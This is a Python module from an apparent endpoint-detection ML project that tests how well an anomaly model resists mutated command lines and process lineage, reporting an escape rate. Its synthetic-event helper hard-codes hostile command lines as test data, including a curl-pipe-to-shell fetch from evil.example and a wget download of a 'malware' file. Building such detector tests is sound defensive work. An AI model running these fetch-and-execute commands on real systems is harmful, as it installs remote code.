"""Robustness evaluation runner (issue #45).

Applies mutators to scenario events, scores original vs mutated, and generates
RobustnessCard with escape rate and degradation metrics. Mirrors the pattern
of scenario_replay.py but for adversarial evaluation rather than functional
detection.

Flow:
1. Load scenario expected_detections
2. Extract source events from scenario artifacts (stub for now)
3. Apply each mutator at light/medium/heavy
4. Score original vs mutated (stub for now - needs model integration)
5. Compute metrics (escape_rate, degradations)
"""

from __future__ import annotations

import json
import statistics
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from synthaea_ml.data.aggregate_correlation import flatten_wire_event
from synthaea_ml.data.canonical import ml_cmdline_from_record
from synthaea_ml.evaluation.mutations.base import Mutator
from synthaea_ml.evaluation.mutations.cmdline import ALL_T0_MUTATORS
from synthaea_ml.evaluation.mutations.lineage import ALL_LINEAGE_MUTATORS
from synthaea_ml.evaluation.mutations.prng import LCG
from synthaea_ml.evaluation.scenario_replay import _sha256_file, load_expected_detections
from synthaea_ml.features import correlation, lineage
from synthaea_ml.features.cmdline import extract_features
from synthaea_ml.registry.training_record import MutationTestResult, RobustnessCard

_HASH_CHUNK = 1 << 16  # 64 KiB, matches scenario_replay.py


def _score_cmdline(model: Any, cmdline: str, threshold: float) -> float:
    """Score one command line using the model.

    Args:
        model: Trained model (sklearn IsolationForest with decision_function).
        cmdline: Command-line string (NUL-separated tokens).
        threshold: Model threshold for detection.

    Returns:
        Anomaly score (IsolationForest: negative = more anomalous, positive = benign).
    """
    features = extract_features(cmdline)
    # IsolationForest.decision_function returns negative for anomalies
    score = model.decision_function([features])[0]
    return float(score)


# T1 behavior models score cmdline (9) + correlation (8) + lineage (6) features, in that
# order (issue #48/#617): the layout the Rust side builds for the combined scorer.
T1_FEATURE_COUNT = 9 + len(correlation.FEATURE_NAMES) + len(lineage.FEATURE_NAMES)


def _t1_features(record: dict[str, Any]) -> list[float]:
    """The 23-feature T1 vector for one exec record.

    The mutators only rewrite the record's own fields (command line, parent), so the
    correlation block is *context*: it is taken from `record["correlation_features"]`
    (eight floats computed from the event window the record came from) and held fixed
    across the original and every mutation, so a score delta can only come from the
    mutated fields. Missing context scores as an empty window (all zeros).
    """
    context = record.get("correlation_features")
    if context is None:
        context = [0.0] * len(correlation.FEATURE_NAMES)
    if len(context) != len(correlation.FEATURE_NAMES):
        raise ValueError(
            f"correlation_features must have {len(correlation.FEATURE_NAMES)} values, "
            f"got {len(context)}"
        )
    cmdline = extract_features(ml_cmdline_from_record(record))
    return [*cmdline, *(float(v) for v in context), *lineage.extract_features(record)]


def _score_record(model: Any, record: dict[str, Any], tier: str) -> float:
    """Anomaly score of one record at `tier` (negative = more anomalous).

    T0 scores the command line alone; T1 also scores correlation context and lineage,
    which is what lets the lineage mutators move the score at all (#617).
    """
    if tier == "T1":
        expected = getattr(model, "n_features_in_", T1_FEATURE_COUNT)
        if expected != T1_FEATURE_COUNT:
            raise ValueError(
                f"T1 robustness needs a model trained on {T1_FEATURE_COUNT} features "
                f"(cmdline + correlation + lineage); this model expects {expected}"
            )
        return float(model.decision_function([_t1_features(record)])[0])
    return _score_cmdline(model, ml_cmdline_from_record(record), 0.0)


def _select_mutators_for_tier(tier: str) -> list[Mutator]:
    """Select mutators appropriate for the tier.

    Args:
        tier: One of "T0", "T1", "T2".

    Returns:
        List of mutator instances.

    Raises:
        ValueError: If tier is invalid.
    """
    if tier == "T0":
        return ALL_T0_MUTATORS
    if tier == "T1":
        # The command-line mutators still apply (the cmdline block is part of the T1
        # vector); the lineage mutators are what T1 adds.
        return [*ALL_T0_MUTATORS, *ALL_LINEAGE_MUTATORS]
    if tier == "T2":
        raise NotImplementedError("T2 mutators not yet implemented")
    raise ValueError(f"invalid tier: {tier}")


def run_robustness_evaluation(
    model: Any,
    scenario_yaml: Path,
    tier: str = "T0",
    mutation_seed: int = 42,
    threshold: float | None = None,
    events_source: Path | None = None,
) -> RobustnessCard:
    """Run adversarial evaluation on one scenario.

    Args:
        model: Trained model (sklearn IsolationForest with decision_function).
        scenario_yaml: Path to scenario yaml (e.g., lab/scenarios/beacon.yaml).
        tier: Mutation tier ("T0", "T1", "T2"). Default "T0".
        mutation_seed: Seed for deterministic PRNG. Default 42.
        threshold: Model threshold for detection. If None, uses model's default.
        events_source: Optional path to events.jsonl or baseline.jsonl file.
            If provided, loads real events from this file. If None, uses
            synthetic events based on expected_detections techniques.

    Returns:
        RobustnessCard with mutation results and aggregate metrics.

    Raises:
        FileNotFoundError: If scenario yaml or events_source is missing.
        ValueError: If tier is invalid or scenario has no detections.

    Notes:
        Prefers real events from events_source if provided. Falls back to
        synthetic events if events_source is None (for testing without captures).
    """
    scenario_name, expected = load_expected_detections(scenario_yaml)
    mutators = _select_mutators_for_tier(tier)

    if not expected:
        raise ValueError(f"scenario {scenario_name!r} has no expected_detections")

    # Determine threshold
    if threshold is None:
        # For IsolationForest, threshold is typically 0 (negative = anomaly)
        threshold = 0.0

    rng = LCG(seed=mutation_seed)
    results: list[MutationTestResult] = []

    # Load events from source or generate synthetic malicious events
    # IMPORTANT: events_source should contain MALICIOUS events matching the
    # scenario's expected_detections, NOT benign baseline events. Escape rate
    # is only meaningful when computed on originally-detected samples.
    if events_source and events_source.exists():
        source_events = _load_events_from_source(
            events_source, with_context=(tier == "T1")
        )
        # Use all loaded events (no arbitrary limit)
        events_to_test = source_events if source_events else []

        if not events_to_test:
            # No events loaded, fall back to synthetic
            events_to_test = [
                _create_synthetic_event_for_detection(d.technique, tier) for d in expected
            ]
    else:
        # Generate synthetic malicious events for each expected detection
        # This is the default path - synthetic events are guaranteed to be
        # anomalous (score < threshold), making escape_rate meaningful
        events_to_test = [
            _create_synthetic_event_for_detection(d.technique, tier) for d in expected
        ]

    # Run mutations on each event
    for event in events_to_test:
        original_score = _score_record(model, event, tier)

        for mutator in mutators:
            for intensity in ["light", "medium", "heavy"]:
                try:
                    mutated_record = mutator.mutate(event, intensity, rng)
                    mutated_score = _score_record(model, mutated_record, tier)

                    score_delta = mutated_score - original_score
                    escaped = mutated_score > threshold and original_score <= threshold

                    results.append(
                        MutationTestResult(
                            mutation_class=mutator.mutation_class_name(),
                            intensity=intensity,
                            original_score=original_score,
                            mutated_score=mutated_score,
                            score_delta=score_delta,
                            threshold=threshold,
                            escaped=escaped,
                            seed=rng.state,
                        )
                    )
                except ValueError:
                    # Skip mutations that fail (e.g., empty argv, invalid record)
                    continue

    if not results:
        raise ValueError(f"no mutation results for scenario {scenario_name!r}")

    # Compute aggregate metrics
    # CRITICAL: escape_rate is only meaningful on originally-detected samples
    # (original_score <= threshold). Filter to those before computing.
    originally_detected = [r for r in results if r.original_score <= threshold]

    if not originally_detected:
        # No originally-detected samples means escape_rate is undefined
        # This can happen if events_source contains only benign events
        raise ValueError(
            f"no originally-detected samples for scenario {scenario_name!r} "
            f"(all {len(results)} samples had original_score > {threshold}). "
            f"Are you using malicious events, not benign baseline?"
        )

    escape_rate = sum(r.escaped for r in originally_detected) / len(originally_detected)

    # Score degradations: positive delta means mutation moved toward benign (worse)
    # Compute on all results, not just originally-detected
    score_deltas = [r.score_delta for r in results]
    median_degradation = statistics.median(score_deltas)
    # FIXED: worst case is MAX (most degradation toward benign), not MIN
    worst_case_degradation = max(score_deltas)

    return RobustnessCard(
        scenario_name=scenario_name,
        scenario_yaml_sha256=_sha256_file(scenario_yaml),
        tested_at=datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ"),
        mutation_results=results,
        escape_rate=escape_rate,
        median_score_degradation=median_degradation,
        worst_case_degradation=worst_case_degradation,
    )


def _load_events_from_source(
    events_source: Path, with_context: bool = False
) -> list[dict[str, Any]]:
    """Load exec events from events.jsonl or baseline.jsonl file.

    Args:
        events_source: Path to JSONL file containing events.
        with_context: Also attach what the T1 tier scores beyond the command line:
            `correlation_features` (computed from the whole file as one correlation
            window, filtered by `(pid, process_generation)`) on every exec record
            that has a pid. Off for T0, which scores the command line alone.

    Returns:
        List of event records with cmdline/argv fields, plus `parent_comm` /
        `parent_image_path` whenever the source carries them (the lineage the T1 tier
        scores and the lineage mutators rewrite).

    Raises:
        FileNotFoundError: If events_source does not exist.
    """
    if not events_source.exists():
        raise FileNotFoundError(f"events_source not found: {events_source}")

    window: list[dict[str, Any]] = []
    events: list[dict[str, Any]] = []
    for line in events_source.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            record = json.loads(line)
        except json.JSONDecodeError:
            continue
        if not isinstance(record, dict):
            continue
        # The agent's own events.jsonl nests identity under `meta`; baseline and
        # hand-built sources are already flat. Normalize the former so real captures
        # carry their pid, incarnation and lineage into the T1 tier.
        if "meta" in record:
            record = flatten_wire_event(record) or record
        if with_context and "pid" in record and "type" in record:
            window.append(record)

        # Extract exec events (type=="exec") or baseline records (have argv/cmdline)
        is_exec = record.get("type") == "exec"
        has_cmdline = "argv" in record or "cmdline" in record

        if is_exec or has_cmdline:
            # Normalize to baseline format (argv/cmdline at top level)
            if "argv" in record:
                loaded: dict[str, Any] = {"argv": record["argv"], "cmdline": record.get("cmdline")}
            elif "cmdline" in record and record.get("cmdline", "").strip() != "":
                # Windows: cmdline without argv
                loaded = {"cmdline": record["cmdline"]}
            else:
                continue
            for key in ("parent_comm", "parent_image_path", "pid", "process_generation"):
                if key in record:
                    loaded[key] = record[key]
            events.append(loaded)

    if with_context:
        for loaded in events:
            if "pid" in loaded:
                loaded["correlation_features"] = correlation.extract_features(
                    window, loaded["pid"], loaded.get("process_generation")
                )
    return events


def _create_synthetic_event_for_detection(technique: str, tier: str = "T0") -> dict[str, Any]:
    """Create synthetic event for a detection technique.

    Fallback when no events_source is provided. Maps ATT&CK technique to
    plausible malicious command line.

    Args:
        technique: ATT&CK technique(s) like "T1071" or "T1059/T1071".
        tier: At "T1" the record also carries the suspicious lineage that technique
            typically arrives with (a web server spawning a shell, a dropper in a temp
            directory), so the lineage mutators have something to move. "T0" output
            is the bare command line, unchanged.

    Returns:
        Synthetic event record with argv field.
    """
    # Map technique to plausible malicious command line
    if "T1071" in technique:  # Command and Control
        record: dict[str, Any] = {
            "argv": ["curl", "-fsSL", "https://evil.example/payload", "|", "sh"]
        }
        parent = ("dropper", "/tmp/dropper")
    elif "T1059" in technique:  # Command and Scripting Interpreter
        record = {"argv": ["bash", "-c", "echo aGVsbG8= | base64 -d"]}
        parent = ("nginx", "/usr/sbin/nginx")
    elif "T1105" in technique:  # Ingress Tool Transfer
        record = {"argv": ["wget", "-O", "/tmp/malware", "https://evil.example/tool"]}
        parent = ("bash", "/tmp/dropper")
    else:
        # Default: generic suspicious command
        record = {"argv": ["bash", "-c", "base64 -d"]}
        parent = ("dropper", "/dev/shm/payload")

    if tier == "T1":
        record["parent_comm"], record["parent_image_path"] = parent
    return record
